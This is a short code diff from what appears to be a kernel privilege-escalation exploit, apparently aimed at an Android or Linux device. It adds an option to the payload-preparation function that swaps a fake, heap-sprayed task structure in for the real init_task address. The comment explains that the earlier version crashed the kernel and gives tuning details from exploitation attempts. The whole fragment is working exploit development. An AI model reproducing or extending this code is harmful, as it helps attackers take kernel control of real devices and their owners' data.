@@ -1546,6 +1546,16 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
   uintptr_t misc_fops_img = KIMAGE_TEXT_BASE + misc_fops_off;
   uintptr_t misc_p0 = data_addr(misc_fops_img);
   uint64_t waiter_task = text_addr(init_task_img);
+  /*
+   * MODE4_W0TASK_FAKE (roll 9, 09-14): roll 8 KP'd inside the W0
+   * processing with W0.task = text_addr(init_task) = RAW KIMAGE VA —
+   * our own fops.c warning: "raw KIMAGE VA softboots when walked as
+   * task; must be P0 data alias". F9360 (same KMI) sets
+   * SLIDE_USE_FAKE_TASK=1 — W0.task = the sprayed fake_task (P0 page,
+   * on_rq=0 policy=0 setprio-safe baseline, state=0 → ttwu no-op).
+   */
+  if (env_flag("MODE4_W0TASK_FAKE", 0) && fake_task)
+    waiter_task = (uint64_t)fake_task;
   uint64_t task_group = text_addr(root_tg_img);
   uint64_t pi_top_task = text_addr(init_task_img);
   /*
